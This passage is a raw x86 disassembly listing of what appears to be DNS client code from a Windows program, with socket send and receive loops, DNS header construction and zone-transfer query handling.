  40a716:	jmp    0x40a720
  40a718:	cmp    al,0x2e
  40a71a:	jne    0x40a71d
  40a71c:	inc    edi
  40a71d:	inc    ecx
  40a71e:	mov    al,BYTE PTR [ecx]
  40a720:	test   al,al
  40a722:	jne    0x40a718
  40a724:	mov    ecx,0x411360
  40a729:	cmp    edi,0x2
  40a72c:	jl     0x40a758
  40a72e:	mov    eax,0x40e15a
  40a733:	cmp    ecx,0x411368
  40a739:	jae    0x40a758
  40a73b:	push   0x2e
  40a73d:	push   eax
  40a73e:	call   DWORD PTR ds:0x4130f0
  40a744:	pop    ecx
  40a745:	pop    ecx
  40a746:	mov    ecx,DWORD PTR [ebp-0x18]
  40a749:	inc    eax
  40a74a:	mov    DWORD PTR [ecx],eax
  40a74c:	add    ecx,0x4
  40a74f:	dec    edi
  40a750:	mov    DWORD PTR [ebp-0x18],ecx
  40a753:	cmp    edi,0x2
  40a756:	jge    0x40a733
  40a758:	and    DWORD PTR [ecx],0x0
  40a75b:	or     DWORD PTR ds:0x40e128,0x1
  40a762:	push   esi
  40a763:	call   DWORD PTR ds:0x413100
  40a769:	pop    ecx
  40a76a:	xor    eax,eax
  40a76c:	jmp    0x40a77e
  40a76e:	push   0xd5
  40a773:	push   edi
  40a774:	call   0x40b328
  40a779:	pop    ecx
  40a77a:	pop    ecx
  40a77b:	or     eax,0xffffffff
  40a77e:	pop    edi
  40a77f:	pop    esi
  40a780:	mov    esp,ebp
  40a782:	pop    ebp
  40a783:	mov    esp,ebx
  40a785:	pop    ebx
  40a786:	ret    
  40a787:	int3   
  40a788:	int3   
  40a789:	int3   
  40a78a:	int3   
  40a78b:	int3   
  40a78c:	mov    edi,edi
  40a78e:	push   ebx
  40a78f:	push   esi
  40a790:	push   edi
  40a791:	push   0xc00c
  40a796:	mov    edi,edx
  40a798:	mov    ebx,ecx
  40a79a:	call   DWORD PTR ds:0x413014
  40a7a0:	push   0x6
  40a7a2:	mov    WORD PTR [edi],ax
  40a7a5:	call   DWORD PTR ds:0x413014
  40a7ab:	push   0x1
  40a7ad:	mov    WORD PTR [edi+0x2],ax
  40a7b1:	call   DWORD PTR ds:0x413014
  40a7b7:	mov    WORD PTR [edi+0x4],ax
  40a7bb:	lea    esi,[edi+0xa]
  40a7be:	and    DWORD PTR [edi+0x6],0x0
  40a7c2:	push   0xc00c
  40a7c7:	call   DWORD PTR ds:0x413014
  40a7cd:	push   0xc00c
  40a7d2:	mov    WORD PTR [edi+0xc],ax
  40a7d6:	call   DWORD PTR ds:0x413014
  40a7dc:	mov    WORD PTR [edi+0xe],ax
  40a7e0:	add    edi,0x10
  40a7e3:	push   DWORD PTR ds:0x41142c
  40a7e9:	call   DWORD PTR ds:0x413044
  40a7ef:	mov    DWORD PTR [edi],eax
  40a7f1:	xor    ecx,ecx
  40a7f3:	push   0x4
  40a7f5:	pop    eax
  40a7f6:	add    edi,eax
  40a7f8:	mov    DWORD PTR [edi],ecx
  40a7fa:	add    edi,eax
  40a7fc:	mov    DWORD PTR [edi],ecx
  40a7fe:	add    edi,eax
  40a800:	mov    DWORD PTR [edi],ecx
  40a802:	add    edi,eax
  40a804:	mov    DWORD PTR [edi],ecx
  40a806:	add    edi,eax
  40a808:	mov    eax,edi
  40a80a:	sub    eax,esi
  40a80c:	sub    eax,0x2
  40a80f:	push   eax
  40a810:	call   DWORD PTR ds:0x413014
  40a816:	cmp    DWORD PTR ds:0x411428,0x0
  40a81d:	mov    WORD PTR [esi],ax
  40a820:	je     0x40a82a
  40a822:	mov    WORD PTR [edi],0x534d
  40a827:	add    edi,0x2
  40a82a:	push   0x1
  40a82c:	call   DWORD PTR ds:0x413014
  40a832:	mov    WORD PTR [ebx+0x8],ax
  40a836:	mov    eax,edi
  40a838:	pop    edi
  40a839:	pop    esi
  40a83a:	pop    ebx
  40a83b:	ret    
  40a83c:	int3   
  40a83d:	int3   
  40a83e:	int3   
  40a83f:	int3   
  40a840:	int3   
  40a841:	mov    edi,edi
  40a843:	push   ebp
  40a844:	mov    ebp,esp
  40a846:	sub    esp,0x38
  40a849:	mov    eax,ds:0x40e004
  40a84e:	xor    eax,ebp
  40a850:	mov    DWORD PTR [ebp-0x4],eax
  40a853:	cmp    DWORD PTR [ebp+0xc],0xc
  40a857:	push   edi
  40a858:	mov    edi,DWORD PTR [ebp+0x8]
  40a85b:	mov    DWORD PTR [ebp-0x30],edx
  40a85e:	mov    DWORD PTR [ebp-0x38],ecx
  40a861:	mov    DWORD PTR [ebp-0x34],edi
  40a864:	jae    0x40a86e
  40a866:	or     eax,0xffffffff
  40a869:	jmp    0x40a94a
  40a86e:	xor    eax,eax
  40a870:	stos   DWORD PTR es:[edi],eax
  40a871:	push   esi
  40a872:	stos   DWORD PTR es:[edi],eax
  40a873:	stos   DWORD PTR es:[edi],eax
  40a874:	mov    ax,ds:0x40e158
  40a87a:	inc    ax
  40a87c:	mov    ds:0x40e158,ax
  40a882:	movzx  eax,ax
  40a885:	push   eax
  40a886:	call   DWORD PTR ds:0x413014
  40a88c:	mov    edi,DWORD PTR [ebp-0x34]
  40a88f:	and    DWORD PTR [ebp-0x28],0x0
  40a893:	mov    DWORD PTR [ebp-0x2c],edi
  40a896:	and    BYTE PTR [edi+0x2],0x87
  40a89a:	lea    esi,[edi+0xc]
  40a89d:	mov    WORD PTR [edi],ax
  40a8a0:	mov    eax,ds:0x40e128
  40a8a5:	shr    eax,0x4
  40a8a8:	shl    al,0x6
  40a8ab:	xor    al,BYTE PTR [edi+0x3]
  40a8ae:	and    al,0x40
  40a8b0:	xor    BYTE PTR [edi+0x3],al
  40a8b3:	mov    eax,ds:0x40e128
  40a8b8:	and    BYTE PTR [edi+0x3],0xf0
  40a8bc:	shr    eax,0x6
  40a8bf:	xor    al,BYTE PTR [edi+0x2]
  40a8c2:	and    al,0x1
  40a8c4:	xor    BYTE PTR [edi+0x2],al
  40a8c7:	mov    eax,DWORD PTR [ebp+0xc]
  40a8ca:	sub    eax,0xc
  40a8cd:	sub    eax,0x4
  40a8d0:	js     0x40a8e9
  40a8d2:	lea    ecx,[ebp-0x4]
  40a8d5:	mov    edx,esi
  40a8d7:	push   ecx
  40a8d8:	lea    ecx,[ebp-0x2c]
  40a8db:	push   ecx
  40a8dc:	mov    ecx,DWORD PTR [ebp-0x38]
  40a8df:	push   eax
  40a8e0:	call   0x409f3d
  40a8e5:	test   eax,eax
  40a8e7:	jns    0x40a8ee
  40a8e9:	or     eax,0xffffffff
  40a8ec:	jmp    0x40a949
  40a8ee:	add    esi,eax
  40a8f0:	mov    eax,DWORD PTR [ebp-0x30]
  40a8f3:	push   0x1
  40a8f5:	mov    BYTE PTR [esi+0x1],al
  40a8f8:	shr    eax,0x8
  40a8fb:	mov    BYTE PTR [esi],al
  40a8fd:	mov    eax,DWORD PTR [ebp+0x10]
  40a900:	mov    BYTE PTR [esi+0x3],al
  40a903:	shr    eax,0x8
  40a906:	mov    BYTE PTR [esi+0x2],al
  40a909:	add    esi,0x4
  40a90c:	call   DWORD PTR ds:0x413014
  40a912:	mov    WORD PTR [edi+0x4],ax
  40a916:	mov    eax,DWORD PTR [ebp-0x30]
  40a919:	cmp    eax,0xfc
  40a91e:	jne    0x40a933
  40a920:	cmp    DWORD PTR ds:0x411428,0x0
  40a927:	je     0x40a945
  40a929:	mov    WORD PTR [esi],0x534d
  40a92e:	add    esi,0x2
  40a931:	jmp    0x40a945
  40a933:	cmp    eax,0xfb
  40a938:	jne    0x40a945
  40a93a:	mov    edx,esi
  40a93c:	mov    ecx,edi
  40a93e:	call   0x40a78c
  40a943:	mov    esi,eax
  40a945:	sub    esi,edi
  40a947:	mov    eax,esi
  40a949:	pop    esi
  40a94a:	mov    ecx,DWORD PTR [ebp-0x4]
  40a94d:	xor    ecx,ebp
  40a94f:	pop    edi
  40a950:	call   0x40cd10
  40a955:	mov    esp,ebp
  40a957:	pop    ebp
  40a958:	ret    0xc
  40a95b:	int3   
  40a95c:	int3   
  40a95d:	int3   
  40a95e:	int3   
  40a95f:	int3   
  40a960:	mov    edi,edi
  40a962:	push   ebx
  40a963:	mov    ebx,esp
  40a965:	push   ecx
  40a966:	push   ecx
  40a967:	and    esp,0xfffffff8
  40a96a:	add    esp,0x4
  40a96d:	push   ebp
  40a96e:	mov    ebp,DWORD PTR [ebx+0x4]
  40a971:	mov    DWORD PTR [esp+0x4],ebp
  40a975:	mov    ebp,esp
  40a977:	sub    esp,0x358
  40a97d:	mov    eax,ds:0x40e004
  40a982:	xor    eax,ebp
  40a984:	mov    DWORD PTR [ebp-0x4],eax
  40a987:	mov    eax,DWORD PTR [ebx+0x14]
  40a98a:	push   esi
  40a98b:	mov    esi,ecx
  40a98d:	mov    DWORD PTR [ebp-0x354],eax
  40a993:	mov    ecx,DWORD PTR [ebx+0x8]
  40a996:	xor    eax,eax
  40a998:	mov    DWORD PTR [ebp-0x328],edx
  40a99e:	mov    DWORD PTR [ebp-0x330],esi
  40a9a4:	mov    DWORD PTR [ebp-0x320],ecx
  40a9aa:	mov    DWORD PTR [ebp-0x334],eax
  40a9b0:	mov    DWORD PTR [ebp-0x324],eax
  40a9b6:	mov    DWORD PTR [ebp-0x344],eax
  40a9bc:	mov    WORD PTR [ebp-0x314],ax
  40a9c3:	push   edi
  40a9c4:	mov    edi,DWORD PTR [ebx+0xc]
  40a9c7:	mov    DWORD PTR [ebp-0x31c],edi
  40a9cd:	test   esi,esi
  40a9cf:	jne    0x40a9d9
  40a9d1:	push   0xfffffffb
  40a9d3:	pop    eax
  40a9d4:	jmp    0x40b13b
  40a9d9:	test   DWORD PTR ds:0x40e128,0x80000000
  40a9e3:	je     0x40aa1d
  40a9e5:	push   ecx
  40a9e6:	push   0x403664
  40a9eb:	call   DWORD PTR ds:0x413198
  40a9f1:	push   0x1
  40a9f3:	call   0x40d391
  40a9f8:	mov    edx,DWORD PTR [ebp-0x320]
  40a9fe:	add    esp,0xc
  40aa01:	push   eax
  40aa02:	push   ecx
  40aa03:	mov    ecx,DWORD PTR [ebp-0x328]
  40aa09:	lea    edx,[edx+ecx*1]
  40aa0c:	call   0x404e4b
  40aa11:	mov    ecx,DWORD PTR [ebp-0x320]
  40aa17:	mov    edx,DWORD PTR [ebp-0x328]
  40aa1d:	movzx  eax,WORD PTR [esi]
  40aa20:	mov    DWORD PTR [ebp-0x318],0x2
  40aa2a:	cmp    ax,WORD PTR [ebp-0x318]
  40aa31:	jne    0x40aa42
  40aa33:	mov    edi,0x3500
  40aa38:	mov    WORD PTR [esi+0x2],di
  40aa3c:	mov    edi,DWORD PTR [ebp-0x31c]
  40aa42:	cmp    eax,0x17
  40aa45:	jne    0x40aa50
  40aa47:	mov    eax,0x3500
  40aa4c:	mov    WORD PTR [esi+0x2],ax
  40aa50:	test   BYTE PTR ds:0x40e128,0x8
  40aa57:	mov    eax,0x200
  40aa5c:	jne    0x40aa66
  40aa5e:	cmp    ecx,eax
  40aa60:	jg     0x40aa66
  40aa62:	xor    ecx,ecx
  40aa64:	jmp    0x40aa69
  40aa66:	xor    ecx,ecx
  40aa68:	inc    ecx
  40aa69:	movzx  eax,WORD PTR [edx]
  40aa6c:	mov    DWORD PTR [ebp-0x358],eax
  40aa72:	xor    eax,eax
  40aa74:	mov    DWORD PTR [ebp-0x338],eax
  40aa7a:	mov    eax,ds:0x40e124
  40aa7f:	mov    DWORD PTR [ebp-0x32c],ecx
  40aa85:	test   eax,eax
  40aa87:	jle    0x40b0f0
  40aa8d:	test   ecx,ecx
  40aa8f:	jne    0x40ac79
  40aa95:	cmp    DWORD PTR ds:0x411434,0xffffffff
  40aa9c:	jne    0x40aadb
  40aa9e:	movzx  eax,WORD PTR [esi]
  40aaa1:	push   ecx
  40aaa2:	push   DWORD PTR [ebp-0x318]
  40aaa8:	push   eax
  40aaa9:	call   DWORD PTR ds:0x413024
  40aaaf:	mov    ds:0x411434,eax
  40aab4:	cmp    eax,0xffffffff
  40aab7:	jne    0x40aadb
  40aab9:	call   DWORD PTR ds:0x41302c
  40aabf:	mov    eax,DWORD PTR [ebp-0x318]
  40aac5:	test   BYTE PTR ds:0x40e128,al
  40aacb:	je     0x40afb8
  40aad1:	push   0x4036dc
  40aad6:	jmp    0x40accc
  40aadb:	cmp    DWORD PTR [ebp-0x324],0x0
  40aae2:	jne    0x40ab03
  40aae4:	push   DWORD PTR [esi+0x20]
  40aae7:	push   esi
  40aae8:	push   DWORD PTR ds:0x411434
  40aaee:	call   DWORD PTR ds:0x413054
  40aaf4:	cmp    eax,0xffffffff
  40aaf7:	je     0x40ab48
  40aaf9:	mov    DWORD PTR [ebp-0x324],0x1
  40ab03:	push   0x0
  40ab05:	push   DWORD PTR [ebp-0x320]
  40ab0b:	push   DWORD PTR [ebp-0x328]
  40ab11:	push   DWORD PTR ds:0x411434
  40ab17:	call   DWORD PTR ds:0x41301c
  40ab1d:	cmp    eax,0xffffffff
  40ab20:	je     0x40ad67
  40ab26:	mov    eax,ds:0x40e120
  40ab2b:	mov    DWORD PTR [ebp-0x340],eax
  40ab31:	test   eax,eax
  40ab33:	jg     0x40ab3f
  40ab35:	mov    DWORD PTR [ebp-0x340],0x1
  40ab3f:	and    DWORD PTR [ebp-0x33c],0x0
  40ab46:	jmp    0x40ab66
  40ab48:	mov    eax,DWORD PTR [ebp-0x318]
  40ab4e:	test   BYTE PTR ds:0x40e128,al
  40ab54:	je     0x40afb8
  40ab5a:	push   0x4036f0
  40ab5f:	jmp    0x40accc
  40ab64:	mov    edi,ecx
  40ab66:	mov    eax,ds:0x411434
  40ab6b:	lea    ecx,[ebp-0x340]
  40ab71:	push   ecx
  40ab72:	push   0x0
  40ab74:	push   0x0
  40ab76:	lea    ecx,[ebp-0x310]
  40ab7c:	mov    DWORD PTR [ebp-0x30c],eax
  40ab82:	push   ecx
  40ab83:	push   eax
  40ab84:	mov    DWORD PTR [ebp-0x310],0x1
  40ab8e:	call   DWORD PTR ds:0x413040
  40ab94:	test   eax,eax
  40ab96:	js     0x40ad3c
  40ab9c:	je     0x40aced
  40aba2:	push   0x0
  40aba4:	push   0x10000
  40aba9:	push   edi
  40abaa:	push   DWORD PTR ds:0x411434
  40abb0:	call   DWORD PTR ds:0x413028
  40abb6:	mov    edi,eax
  40abb8:	test   edi,edi
  40abba:	je     0x40acd8
  40abc0:	cmp    edi,0xffffffff
  40abc3:	je     0x40acd8
  40abc9:	mov    ecx,DWORD PTR [ebp-0x31c]
  40abcf:	mov    eax,DWORD PTR [ebp-0x358]
  40abd5:	mov    DWORD PTR [ebp-0x334],0x1
  40abdf:	cmp    ax,WORD PTR [ecx]
  40abe2:	je     0x40ac25
  40abe4:	test   DWORD PTR ds:0x40e128,0x80000000
  40abee:	je     0x40ab64
  40abf4:	push   0x403760
  40abf9:	call   DWORD PTR ds:0x413198
  40abff:	pop    ecx
  40ac00:	push   0x1
  40ac02:	call   0x40d391
  40ac07:	mov    edx,DWORD PTR [ebp-0x31c]
  40ac0d:	pop    ecx
  40ac0e:	push   eax
  40ac0f:	push   ecx
  40ac10:	lea    edx,[edx+edi*1]
  40ac13:	mov    edi,DWORD PTR [ebp-0x31c]
  40ac19:	mov    ecx,edi
  40ac1b:	call   0x404e4b
  40ac20:	jmp    0x40ab66
  40ac25:	mov    eax,ds:0x40e128
  40ac2a:	test   al,0x20
  40ac2c:	jne    0x40b06c
  40ac32:	mov    edx,DWORD PTR [ebp-0x318]
  40ac38:	test   BYTE PTR [ecx+0x2],dl
  40ac3b:	je     0x40b06c
  40ac41:	test   dl,al
  40ac43:	je     0x40ac51
  40ac45:	push   0x40377c
  40ac4a:	call   DWORD PTR ds:0x413198
  40ac50:	pop    ecx
  40ac51:	push   DWORD PTR ds:0x411434
  40ac57:	call   DWORD PTR ds:0x413020
  40ac5d:	or     DWORD PTR ds:0x411434,0xffffffff
  40ac64:	mov    eax,ds:0x40e124
  40ac69:	mov    edi,DWORD PTR [ebp-0x31c]
  40ac6f:	mov    DWORD PTR [ebp-0x32c],0x1
  40ac79:	and    DWORD PTR [ebp-0x348],0x0
  40ac80:	cmp    DWORD PTR ds:0x411434,0xffffffff
  40ac87:	mov    DWORD PTR [ebp-0x338],eax
  40ac8d:	jne    0x40adcb
  40ac93:	movzx  eax,WORD PTR [esi]
  40ac96:	push   0x0
  40ac98:	push   0x1
  40ac9a:	push   eax
  40ac9b:	call   DWORD PTR ds:0x413024
  40aca1:	mov    ds:0x411434,eax
  40aca6:	cmp    eax,0xffffffff
  40aca9:	jne    0x40ad83
  40acaf:	call   DWORD PTR ds:0x41302c
  40acb5:	mov    eax,DWORD PTR [ebp-0x318]
  40acbb:	test   BYTE PTR ds:0x40e128,al
  40acc1:	je     0x40afb8
  40acc7:	push   0x403688
  40accc:	call   DWORD PTR ds:0x4130f8
  40acd2:	pop    ecx
  40acd3:	jmp    0x40afb8
  40acd8:	mov    eax,DWORD PTR [ebp-0x318]
  40acde:	test   BYTE PTR ds:0x40e128,al
  40ace4:	je     0x40ad56
  40ace6:	push   0x403754
  40aceb:	jmp    0x40ad4f
  40aced:	push   0x403708
  40acf2:	call   DWORD PTR ds:0x413198
  40acf8:	pop    ecx
  40acf9:	push   DWORD PTR [ebp-0x340]
  40acff:	push   0x403720
  40ad04:	call   DWORD PTR ds:0x413198
  40ad0a:	mov    eax,DWORD PTR [ebp-0x318]
  40ad10:	pop    ecx
  40ad11:	pop    ecx
  40ad12:	test   BYTE PTR ds:0x40e128,al
  40ad18:	je     0x40ad2d
  40ad1a:	push   DWORD PTR [ebp-0x340]
  40ad20:	push   0x403740
  40ad25:	call   DWORD PTR ds:0x413198
  40ad2b:	pop    ecx
  40ad2c:	pop    ecx
  40ad2d:	mov    DWORD PTR [ebp-0x334],0x1
  40ad37:	jmp    0x40afb8
  40ad3c:	mov    eax,DWORD PTR [ebp-0x318]
  40ad42:	test   BYTE PTR ds:0x40e128,al
  40ad48:	je     0x40ad56
  40ad4a:	push   0x403700
  40ad4f:	call   DWORD PTR ds:0x4130f8
  40ad55:	pop    ecx
  40ad56:	call   0x40b155
  40ad5b:	and    DWORD PTR [ebp-0x324],0x0
  40ad62:	jmp    0x40afb8
  40ad67:	mov    eax,DWORD PTR [ebp-0x318]
  40ad6d:	test   BYTE PTR ds:0x40e128,al
  40ad73:	je     0x40afb8
  40ad79:	push   0x4036f8
  40ad7e:	jmp    0x40accc
  40ad83:	push   DWORD PTR [esi+0x20]
  40ad86:	push   esi
  40ad87:	push   eax
  40ad88:	call   DWORD PTR ds:0x413054
  40ad8e:	cmp    eax,0xffffffff
  40ad91:	jne    0x40adcb
  40ad93:	call   DWORD PTR ds:0x41302c
  40ad99:	mov    eax,DWORD PTR [ebp-0x318]
  40ad9f:	test   BYTE PTR ds:0x40e128,al
  40ada5:	je     0x40adb3
  40ada7:	push   0x40369c
  40adac:	call   DWORD PTR ds:0x4130f8
  40adb2:	pop    ecx
  40adb3:	push   DWORD PTR ds:0x411434
  40adb9:	call   DWORD PTR ds:0x413020
  40adbf:	or     DWORD PTR ds:0x411434,0xffffffff
  40adc6:	jmp    0x40afb8
  40adcb:	push   DWORD PTR [ebp-0x320]
  40add1:	call   DWORD PTR ds:0x413014
  40add7:	push   0x0
  40add9:	push   DWORD PTR [ebp-0x318]
  40addf:	mov    WORD PTR [ebp-0x314],ax
  40ade6:	lea    eax,[ebp-0x314]
  40adec:	push   eax
  40aded:	push   DWORD PTR ds:0x411434
  40adf3:	call   DWORD PTR ds:0x41301c
  40adf9:	cmp    eax,0xffffffff
  40adfc:	je     0x40afe3
  40ae02:	push   0x0
  40ae04:	push   DWORD PTR [ebp-0x320]
  40ae0a:	push   DWORD PTR [ebp-0x328]
  40ae10:	push   DWORD PTR ds:0x411434
  40ae16:	call   DWORD PTR ds:0x41301c
  40ae1c:	cmp    eax,0xffffffff
  40ae1f:	je     0x40afe3
  40ae25:	mov    ax,WORD PTR [ebp-0x318]
  40ae2c:	mov    WORD PTR [ebp-0x314],ax
  40ae33:	push   0x0
  40ae35:	movzx  eax,ax
  40ae38:	push   eax
  40ae39:	push   edi
  40ae3a:	push   DWORD PTR ds:0x411434
  40ae40:	call   DWORD PTR ds:0x413028
  40ae46:	mov    esi,eax
  40ae48:	test   esi,esi
  40ae4a:	jle    0x40ae61
  40ae4c:	mov    ax,WORD PTR [ebp-0x314]
  40ae53:	add    edi,esi
  40ae55:	sub    ax,si
  40ae58:	mov    WORD PTR [ebp-0x314],ax
  40ae5f:	jne    0x40ae33
  40ae61:	cmp    esi,0xffffffff
  40ae64:	jne    0x40aec6
  40ae66:	call   DWORD PTR ds:0x41302c
  40ae6c:	mov    esi,eax
  40ae6e:	mov    eax,DWORD PTR [ebp-0x318]
  40ae74:	test   BYTE PTR ds:0x40e128,al
  40ae7a:	je     0x40ae88
  40ae7c:	push   0x4036bc
  40ae81:	call   DWORD PTR ds:0x4130f8
  40ae87:	pop    ecx
  40ae88:	push   DWORD PTR ds:0x411434
  40ae8e:	call   DWORD PTR ds:0x413020
  40ae94:	or     DWORD PTR ds:0x411434,0xffffffff
  40ae9b:	cmp    esi,0x6f
  40ae9e:	jne    0x40afb2
  40aea4:	cmp    DWORD PTR [ebp-0x344],0x0
  40aeab:	mov    esi,DWORD PTR [ebp-0x330]
  40aeb1:	jne    0x40afb8
  40aeb7:	mov    DWORD PTR [ebp-0x344],0x1
  40aec1:	jmp    0x40afb8
  40aec6:	mov    eax,DWORD PTR [ebp-0x31c]
  40aecc:	mov    DWORD PTR [ebp-0x34c],eax
  40aed2:	movzx  eax,WORD PTR [eax]
  40aed5:	push   eax
  40aed6:	call   DWORD PTR ds:0x413030
  40aedc:	movzx  edi,ax
  40aedf:	mov    DWORD PTR [ebp-0x350],edi
  40aee5:	cmp    edi,0x10000
  40aeeb:	jbe    0x40af22
  40aeed:	mov    eax,ds:0x40e128
  40aef2:	mov    ecx,DWORD PTR [ebp-0x318]
  40aef8:	test   cl,al
  40aefa:	je     0x40af16
  40aefc:	push   0x4036c8
  40af01:	push   ecx
  40af02:	call   0x40d391
  40af07:	pop    ecx
  40af08:	push   eax
  40af09:	call   DWORD PTR ds:0x413190
  40af0f:	mov    eax,ds:0x40e128
  40af14:	pop    ecx
  40af15:	pop    ecx
  40af16:	xor    ecx,ecx
  40af18:	mov    WORD PTR [ebp-0x314],cx
  40af1f:	inc    ecx
  40af20:	jmp    0x40af76
  40af22:	mov    ax,di
  40af25:	mov    WORD PTR [ebp-0x314],ax
  40af2c:	test   di,di
  40af2f:	je     0x40af6b
  40af31:	mov    edi,DWORD PTR [ebp-0x34c]
  40af37:	push   0x0
  40af39:	movzx  eax,ax
  40af3c:	push   eax
  40af3d:	push   edi
  40af3e:	push   DWORD PTR ds:0x411434
  40af44:	call   DWORD PTR ds:0x413028
  40af4a:	mov    esi,eax
  40af4c:	test   esi,esi
  40af4e:	jle    0x40af65
  40af50:	mov    ax,WORD PTR [ebp-0x314]
  40af57:	add    edi,esi
  40af59:	sub    ax,si
  40af5c:	mov    WORD PTR [ebp-0x314],ax
  40af63:	jne    0x40af37
  40af65:	mov    edi,DWORD PTR [ebp-0x350]
  40af6b:	mov    eax,ds:0x40e128
  40af70:	mov    ecx,DWORD PTR [ebp-0x348]
  40af76:	cmp    esi,0xffffffff
  40af79:	jne    0x40b005
  40af7f:	call   DWORD PTR ds:0x41302c
  40af85:	mov    eax,DWORD PTR [ebp-0x318]
  40af8b:	test   BYTE PTR ds:0x40e128,al
  40af91:	je     0x40af9f
  40af93:	push   0x4036bc
  40af98:	call   DWORD PTR ds:0x4130f8
  40af9e:	pop    ecx
  40af9f:	push   DWORD PTR ds:0x411434
  40afa5:	call   DWORD PTR ds:0x413020
  40afab:	or     DWORD PTR ds:0x411434,0xffffffff
  40afb2:	mov    esi,DWORD PTR [ebp-0x330]
  40afb8:	mov    edx,DWORD PTR [ebp-0x338]
  40afbe:	mov    eax,ds:0x40e124
  40afc3:	inc    edx
  40afc4:	mov    DWORD PTR [ebp-0x338],edx
  40afca:	cmp    edx,eax
  40afcc:	jge    0x40b0f0
  40afd2:	mov    edi,DWORD PTR [ebp-0x31c]
  40afd8:	mov    ecx,DWORD PTR [ebp-0x32c]
  40afde:	jmp    0x40aa8d
  40afe3:	call   DWORD PTR ds:0x41302c
  40afe9:	mov    eax,DWORD PTR [ebp-0x318]
  40afef:	test   BYTE PTR ds:0x40e128,al
  40aff5:	je     0x40adb3
  40affb:	push   0x4036ac
  40b000:	jmp    0x40adac
  40b005:	test   ecx,ecx
  40b007:	je     0x40b06c
  40b009:	mov    ecx,DWORD PTR [ebp-0x31c]
  40b00f:	mov    eax,DWORD PTR [ebp-0x318]
  40b015:	or     BYTE PTR [ecx+0x2],al
  40b018:	mov    ax,di
  40b01b:	mov    WORD PTR [ebp-0x314],ax
  40b022:	test   ax,ax
  40b025:	je     0x40b067
  40b027:	mov    esi,0x200
  40b02c:	cmp    ax,si
  40b02f:	jbe    0x40b035
  40b031:	mov    eax,esi
  40b033:	jmp    0x40b038
  40b035:	movzx  eax,ax
  40b038:	push   0x0
  40b03a:	push   eax
  40b03b:	lea    eax,[ebp-0x208]
  40b041:	push   eax
  40b042:	push   DWORD PTR ds:0x411434
  40b048:	call   DWORD PTR ds:0x413028
  40b04e:	mov    ecx,eax
  40b050:	test   ecx,ecx
  40b052:	jle    0x40b067
  40b054:	mov    ax,WORD PTR [ebp-0x314]
  40b05b:	sub    ax,cx
  40b05e:	mov    WORD PTR [ebp-0x314],ax
  40b065:	jne    0x40b02c
  40b067:	mov    eax,ds:0x40e128
  40b06c:	mov    ecx,DWORD PTR [ebp-0x318]
  40b072:	test   cl,al
  40b074:	je     0x40b0d1
  40b076:	test   eax,eax
  40b078:	jns    0x40b089
  40b07a:	push   edi
  40b07b:	push   0x403790
  40b080:	call   DWORD PTR ds:0x413198
  40b086:	pop    ecx
  40b087:	jmp    0x40b094
  40b089:	push   0x4037b8
  40b08e:	call   DWORD PTR ds:0x413198
  40b094:	pop    ecx
  40b095:	cmp    edi,0x10000
  40b09b:	jae    0x40b0a2
  40b09d:	mov    ax,di
  40b0a0:	jmp    0x40b0a4
  40b0a2:	xor    eax,eax
  40b0a4:	mov    WORD PTR [ebp-0x314],ax
  40b0ab:	cmp    ax,0xc
  40b0af:	jb     0x40b0d1
  40b0b1:	movzx  esi,ax
  40b0b4:	add    esi,DWORD PTR [ebp-0x31c]
  40b0ba:	push   0x1
  40b0bc:	call   0x40d391
  40b0c1:	pop    ecx
  40b0c2:	push   eax
  40b0c3:	push   ecx
  40b0c4:	mov    ecx,DWORD PTR [ebp-0x31c]
  40b0ca:	mov    edx,esi
  40b0cc:	call   0x404e4b
  40b0d1:	push   DWORD PTR ds:0x411434
  40b0d7:	call   DWORD PTR ds:0x413020
  40b0dd:	mov    eax,DWORD PTR [ebp-0x354]
  40b0e3:	or     DWORD PTR ds:0x411434,0xffffffff
  40b0ea:	mov    DWORD PTR [eax],edi
  40b0ec:	xor    eax,eax
  40b0ee:	jmp    0x40b13b
  40b0f0:	mov    eax,ds:0x411434
  40b0f5:	cmp    eax,0xffffffff
  40b0f8:	je     0x40b108
  40b0fa:	push   eax
  40b0fb:	call   DWORD PTR ds:0x413020
  40b101:	or     DWORD PTR ds:0x411434,0xffffffff
  40b108:	cmp    DWORD PTR [ebp-0x32c],0x0
  40b10f:	jne    0x40b125
  40b111:	xor    eax,eax
  40b113:	cmp    DWORD PTR [ebp-0x334],eax
  40b119:	setne  al
  40b11c:	lea    eax,[eax*4-0x5]
  40b123:	jmp    0x40b13b
  40b125:	call   DWORD PTR ds:0x41302c
  40b12b:	sub    eax,0x72
  40b12e:	neg    eax
  40b130:	sbb    eax,eax
  40b132:	and    eax,DWORD PTR [ebp-0x318]
  40b138:	add    eax,0xfffffffb
  40b13b:	mov    ecx,DWORD PTR [ebp-0x4]
  40b13e:	pop    edi
  40b13f:	xor    ecx,ebp
  40b141:	pop    esi
  40b142:	call   0x40cd10
  40b147:	mov    esp,ebp
  40b149:	pop    ebp
  40b14a:	mov    esp,ebx
  40b14c:	pop    ebx
  40b14d:	ret    0x10
  40b150:	int3   
  40b151:	int3   
  40b152:	int3   
  40b153:	int3   
  40b154:	int3   
  40b155:	mov    eax,ds:0x411434
  40b15a:	cmp    eax,0xffffffff
  40b15d:	je     0x40b16d
  40b15f:	push   eax
  40b160:	call   DWORD PTR ds:0x413020
  40b166:	or     DWORD PTR ds:0x411434,0xffffffff
  40b16d:	ret    
  40b16e:	int3   
  40b16f:	int3   
  40b170:	int3   
  40b171:	int3   
  40b172:	int3   
  40b173:	mov    edi,edi
  40b175:	push   ebp
  40b176:	mov    ebp,esp
  40b178:	push   ecx
  40b179:	push   ecx
  40b17a:	mov    eax,ecx
  40b17c:	push   ebx
  40b17d:	push   esi
  40b17e:	push   edi
  40b17f:	mov    DWORD PTR [ebp-0x4],eax
  40b182:	lea    esi,[eax+0xc]
  40b185:	movzx  eax,WORD PTR [eax+0x4]
  40b189:	mov    edi,edx
  40b18b:	push   eax
  40b18c:	call   DWORD PTR ds:0x413030
  40b192:	mov    ebx,DWORD PTR [ebp+0x8]
  40b195:	movzx  eax,ax
  40b198:	test   eax,eax
  40b19a:	je     0x40b1c5
  40b19c:	sub    eax,0x1
  40b19f:	mov    DWORD PTR [ebp-0x8],eax
  40b1a2:	js     0x40b1c5
  40b1a4:	cmp    esi,ebx
  40b1a6:	jae    0x40b1c5
  40b1a8:	mov    edx,ebx
  40b1aa:	mov    ecx,esi
  40b1ac:	call   0x40a099
  40b1b1:	cmp    eax,0xffffffff
  40b1b4:	je     0x40b25d
  40b1ba:	add    esi,0x4
  40b1bd:	add    esi,eax
  40b1bf:	sub    DWORD PTR [ebp-0x8],0x1
